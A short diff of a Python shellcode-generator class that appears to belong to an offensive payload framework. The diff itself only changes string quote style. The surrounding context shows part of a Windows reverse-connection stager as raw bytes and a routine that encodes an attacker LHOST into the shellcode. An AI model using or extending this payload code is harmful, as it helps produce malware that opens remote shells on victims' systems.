@@ -23,7 +23,7 @@ class ShellcodeModule:
         self.lport_offset = 202
         self.exitfunc_offset = 226
         self.exit_func = '\xf0\xb5\xa2\x56'
-        self.customized_shellcode = ''
+        self.customized_shellcode = ""
         self.stager = (
             b"\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
             b"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
@@ -64,7 +64,7 @@ class ShellcodeModule:
 
     def payload_gen(self):
         # Take the passed in attributes and gen shellcode
-        ip_shellcode = ''
+        ip_shellcode = ""
         n = 2
         ip_shellcode_stage = binascii.hexlify(socket.inet_aton(self.required_options["LHOST"][0]))
         ip_shellcode_stage = [ip_shellcode_stage[i:i + n] for i in range(0, len(ip_shellcode_stage), n)]
